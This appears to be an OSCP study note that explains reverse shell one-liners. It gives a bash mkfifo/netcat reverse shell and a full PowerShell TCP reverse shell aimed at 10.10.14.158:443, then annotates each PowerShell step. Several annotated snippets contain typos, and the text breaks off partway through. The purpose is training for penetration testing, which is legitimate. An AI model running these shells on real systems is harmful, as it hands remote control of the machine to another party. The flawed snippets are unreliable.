---
permalink: oscp/techniques/shells-and-payloads/oneliners-explained
title: Oneliners Explained
type: note
---

## Bash Oneliners

### Netcat Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > tmp/f
```
- `rm -f /tmp/f` deletes `tmp` if it already exists
- `mkfifo /tmp/f` creates a named pipe (FIFO), used to pass data between processes
- `cat /tmp/f` reads commands from the pipe
- `/bin/bash -i` starts a interactive bash shell
- `2>&1` combines error messages with normal output

---

## Powershell One-liners Explained
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Calling Powershell
```powershell
powershell -nop -c
```

###  Binding a Socket
```powershell
"$client = New-Object System.Net.Sockets.TCPClient(<IP>, <PORT>);
```
- Sets TCP socket to `<IP> <PORT>`

### Setting the Command Stream
```powershell
$stream = $client.GetSteam();
```
### Empty Byte Stream
```powershell
[byte[]]$bytes = 0..65535|%{0};
```
- Create a byte type array that returns 65,535 zeros as values in the array

### Stream Parameters
```powershell
while (($i = stream.Read($bytes,0,$bytes,Length)) -ne 0)
```
- Starts a while loop that keeps going while the attacker keeps sending commands 
- Commands are measured in bytes
- If bytes are equal to 0, the while loop exits

### Set The Byte Encoding
```powershell
{; data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)}
```
- Converts bytes from attacker into readable text and stores the result in `$data`
- When an attacker sends `whoami` the stream receives the ASCII bytes `119 104 111 97 109 105` abd the `GetString` objects coverts it to `$data = "whoami"`

### Invoke-Expression
```powershell
$sendback = (iex $data 2>&1 | Out-String);
```
- sets the variable `$setback` equal to the Invoke-Expression `iex` 